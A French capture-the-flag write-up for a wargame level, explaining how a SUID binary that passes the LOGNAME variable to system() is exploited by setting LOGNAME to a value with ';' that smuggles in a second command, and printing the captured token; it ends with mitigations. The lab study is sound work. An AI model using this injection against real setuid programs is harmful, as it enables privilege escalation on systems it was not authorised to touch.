# Level07 — Explications

## Objectif
Exploiter un binaire SUID `flag07` qui construit une commande à partir d'une
variable d'environnement, pour exécuter `getflag` sous son identité et obtenir
le token (= mot de passe de `level08`).

## Étapes

### 1. Repérer le binaire
```bash
ls -la
# -rwsr-sr-x 1 flag07 level07 8805 level07
```

- propriétaire = **flag07**
- bits **SUID + SGID** (`s`) → s'exécute avec les droits de flag07
- `r-x` pour le groupe level07 → level07 peut l'exécuter

### 2. Analyser le binaire (sans gdb)
```bash
strings level07
```

Lignes importantes :
```
getenv          → lit une variable d'environnement
LOGNAME         → le nom de cette variable
/bin/echo %s    → une commande construite avec un %s
asprintf        → construit la chaîne (remplace le %s)
system          → exécute la commande construite
```

**Comportement reconstitué du programme :**
1. il lit la variable d'environnement `LOGNAME` (`getenv`)
2. il insère son contenu à la place du `%s` dans `/bin/echo %s` (`asprintf`)
3. il exécute le résultat avec `system`

Autrement dit : `system("/bin/echo <contenu de LOGNAME>")`.

### 3. Identifier la faille : injection de commande
Le contenu de `LOGNAME` est **contrôlé par l'utilisateur** (variable
d'environnement) et injecté **sans filtrage** dans une commande passée à
`system()`. En plaçant dans `LOGNAME` un séparateur shell `;` suivi d'une
commande, on enchaîne notre propre commande après le `echo`.

### 4. Construire l'exploit
On met dans `LOGNAME` une valeur qui termine le `echo` puis lance `getflag`.
Il faut protéger le `;` avec des guillemets, sinon le shell courant
l'interpréterait tout de suite au lieu de le mettre dans la variable :

```bash
export LOGNAME="peu_importe ; getflag"
```

- `peu_importe` : ce que `/bin/echo` va afficher (sans importance)
- `;` : sépare deux commandes dans le shell lancé par `system`
- `getflag` : exécutée ensuite, en tant que flag07
- les guillemets : empêchent le shell courant d'interpréter le `;`

### 5. Lancer l'exploit
```bash
cd ~
./level07
# peu_importe
# Check flag. Here is your token : fiumuikeil55xe9cu4dood66h
```

Ce qui s'exécute réellement :
```
/bin/echo peu_importe ; getflag
   └─ /bin/echo peu_importe   → affiche "peu_importe"
   └─ getflag                 → exécuté en tant que flag07 → token
```

Token obtenu : `fiumuikeil55xe9cu4dood66h`

C'est le **flag de level07** et le **mot de passe de level08**.

## Résumé
binaire SUID flag07 → construit `system("/bin/echo $LOGNAME")` → `LOGNAME`
contrôlé par l'utilisateur → injection `"... ; getflag"` → getflag en tant que flag07

## À retenir
- Une variable d'environnement (`LOGNAME`) est contrôlée par l'utilisateur :
  tout programme qui lui fait confiance pour construire une commande est
  vulnérable.
- Le `;` sépare deux commandes dans un shell → permet d'en enchaîner une seconde.
- Protéger les caractères spéciaux (`;`) avec des guillemets pour qu'ils aillent
  dans la variable et ne soient pas interprétés par le shell courant.

## Analyse de la faille

**Quelle était la faille ?**
Le programme construisait une commande shell en y insérant directement une
variable d'environnement contrôlée par l'utilisateur, puis l'exécutait avec
`system()`. C'est une **injection de commande**.

**Pourquoi c'est un problème ?**
- Toute entrée contrôlable insérée dans une commande shell sans filtrage permet
  d'exécuter des commandes arbitraires.
- Le programme étant SUID flag07, la commande injectée tourne avec ses droits.

**Comment l'empêcher ?**
- Ne jamais insérer une entrée utilisateur (argument, variable d'environnement)
  dans une commande passée à `system()`.
- Préférer `execve()` avec des arguments séparés et un chemin absolu, sans passer
  par un shell.
- Valider / filtrer strictement les entrées, et appliquer le moindre privilège
  (éviter le SUID quand ce n'est pas nécessaire).